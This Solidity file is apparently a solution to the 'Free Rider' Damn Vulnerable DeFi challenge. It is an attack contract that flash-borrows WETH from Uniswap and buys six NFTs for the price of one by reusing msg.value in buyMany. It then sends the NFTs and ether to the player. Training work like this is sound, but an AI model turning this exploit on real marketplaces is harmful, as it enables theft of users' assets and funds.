// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

contract AttackFR is IUniswapV2Callee, IERC721Receiver {
  address factory;
  address pair;
  address player;
  FreeRiderNFTMarketplace market;
  DamnValuableNFT nft;

  constructor(address _factory, address _pair, address payable _market, address _player, address _nft) {
    factory = _factory;
    pair = _pair;
    market = FreeRiderNFTMarketplace(_market);
    player = _player;
    nft = DamnValuableNFT(_nft);
  }

  //FlashSwap from Uniswap for 15 weth, then Uni calls uniswapV2Call
  function kek() public {
    IUniswapV2Pair(pair).swap(15*10**18, 0, address(this), "0x");
  }

  function uniswapV2Call(address, uint amount0, uint, bytes calldata) external override {
    address weth = IUniswapV2Pair(msg.sender).token0();
    address DVT = IUniswapV2Pair(msg.sender).token1();
    assert(msg.sender == IUniswapV2Factory(factory).getPair(weth, DVT));

    //weth -> eth
    IWETH(weth).withdraw(amount0);
    
    uint256[] memory tokenIDs = new uint256[](6);
    for (uint256 i = 0; i < 6;) {
      unchecked {
      tokenIDs[i] = uint256(i);
      ++i;
      }
    }
    //sends 15 ether, but buys all of the nfts
    market.buyMany{value: 15 ether}(tokenIDs);
    
    //return weth to Uniswap + fees
    uint256 amountReturn = amount0*1000/997+1;
    IWETH(weth).deposit{value: amountReturn}();
    IWETH(weth).transfer(msg.sender, amountReturn);

    //send the nfts and eth to player
    for (uint256 i = 0; i < 6;) {
      unchecked {
      nft.safeTransferFrom(nft.ownerOf(i), player, i);
      ++i;
      }
    }

    (bool sent, ) = player.call{value: address(this).balance - 0.001 ether}("");
    require(sent, "didn't send eth");
  }

  receive() external payable {}

  function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {return IERC721Receiver.onERC721Received.selector;}
}


